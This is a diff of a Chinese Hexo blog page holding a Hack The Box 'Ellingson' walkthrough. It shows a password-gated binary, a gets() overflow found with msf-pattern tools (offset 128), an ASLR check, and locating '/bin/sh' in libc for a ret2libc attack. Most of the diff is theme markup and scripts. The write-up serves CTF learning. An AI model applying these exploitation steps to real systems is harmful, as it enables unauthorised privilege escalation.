+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">margo@ellingson:/tmp/CVE-2021-4034$ garbage <br>Enter access password: N3veRF3@r1iSh3r3!<br><br>access granted.<br>[+] W0rM || Control Application<br>[+] ---------------------------<br>Select Option<br>1: Check Balance<br>2: Launch<br>3: Cancel<br>4: Exit<br>&gt; 1<br>Balance is <span class="hljs-variable">$1337</span><br>&gt; 2<br>Row Row Row Your Boat...<br>&gt; 1<br>Balance is <span class="hljs-variable">$1337</span><br>&gt; 3<br>The tankers have stopped capsizing<br>&gt; 4<br>margo@ellingson:/tmp/CVE-2021-4034$ <br><br></code></pre></td></tr></table></figure>
 
 <h4 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h4><p>在输入密码的地方，有gets的溢出点。拷贝至本地后进一步分析。</p>
 <p>使用<code>msf-pattern_create</code>生成pattern</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box]</span><br><span class="line">└─$ msf-pattern_create -l 200</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面/hack-the-box]<br>└─$ msf-pattern_create -l 200<br>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag<br></code></pre></td></tr></table></figure>
 
 <p>gdb调试程序</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223195454622.png" alt="image-20221223195454622"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223195454622.png" srcset="/img/loading.gif" lazyload alt="image-20221223195454622"></p>
 <p>通过<code>msf-pattern_offset</code>确定offset（这样确定offset很舒服）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box]</span><br><span class="line">└─$ msf-pattern_offset -q 0x4134654133654132</span><br><span class="line">[*] Exact match at offset 128</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面/hack-the-box]<br>└─$ msf-pattern_offset -q 0x4134654133654132<br>[*] Exact match at offset 128<br><br></code></pre></td></tr></table></figure>
 
 <p>查看地址随机化，为开启状态</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hal@ellingson:/tmp/CVE-2021-4034$ <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space </span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hal@ellingson:/tmp/CVE-2021-4034$ <span class="hljs-built_in">cat</span> /proc/sys/kernel/randomize_va_space <br>2<br></code></pre></td></tr></table></figure>
 
 <p>re2libc</p>
 <p>检查了程序本身无<code>system</code>与”&#x2F;bin&#x2F;sh”等可用信息，需要re2libc来获取函数和变量地址</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hal@ellingson:/tmp/CVE-2021-4034$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6|grep /bin/sh</span><br><span class="line"> 1b3e9a /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hal@ellingson:/tmp/CVE-2021-4034$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6|grep /bin/sh<br> 1b3e9a /bin/sh<br><br></code></pre></td></tr></table></figure>
 
 
 
@@ -394,156 +548,353 @@
 
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://infosecwriteups.com/hackthebox-ellingson-7c9a8a87dccb">https://infosecwriteups.com/hackthebox-ellingson-7c9a8a87dccb</a></p>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pentest/">#Pentest</a>
+      
+        <a href="/tags/HTB/">#HTB</a>
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/27/WP-HTB-Password-Cracking/" data-id="clc8mkzpk000ijs9y8pib8ds1" data-title="WP-HTB-Password Cracking" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest/" rel="tag">Pentest</a></li></ul>
+  
+</div>
 
-    </footer>
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WP-HTB-Password Cracking</div>
+      <div>http://example.com/2022/11/27/WP-HTB-Password-Cracking/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>尘埃落定</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
   </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">前一篇</strong>
-      <div class="article-nav-title">
-        
-          Android抓包总结
-        
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/" title="Android抓包总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Android抓包总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/27/MyLogs/" title="MyLogs">
+                        <span class="hidden-mobile">MyLogs</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
       </div>
-    </a>
-  
-  
-    <a href="/2022/11/27/MyLogs/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">后一篇</strong>
-      <div class="article-nav-title">MyLogs</div>
-    </a>
-  
-</nav>
+    </div>
 
-  
-</article>
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
 
 
-</section>
-        
-          <aside id="sidebar">
-  
-    
+  </aside>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest/" rel="tag">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" rel="tag">黑技能</a></li></ul>
+
     </div>
   </div>
+</div>
+
+
+
 
 
   
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/HTB/" style="font-size: 10px;">HTB</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="font-size: 10px;">二进制</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" style="font-size: 10px;">黑技能</a>
-    </div>
-  </div>
 
-  
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
-    </div>
-  </div>
-
-
-  
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2022/12/22/ROP%E4%B9%8Bret2csu/">ROP之ret2csu</a>
-          </li>
-        
-          <li>
-            <a href="/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/">ArmPwn初级</a>
-          </li>
-        
-          <li>
-            <a href="/2022/12/15/Fuzzing%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/">Fuzzing技术文章整理</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/30/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%80%E8%A7%88/">车联网渗透测试一览</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/">Android抓包总结</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
 
-  
-</aside>
-        
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-        <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a></br>
-All website licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></br>
-      
-      &copy; 2023 尘埃落定<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
   </div>
-</footer>
+</div>
 
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
-</nav>
     
 
+    
+  </main>
 
-<script src="/js/jquery-3.4.1.min.js"></script>
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
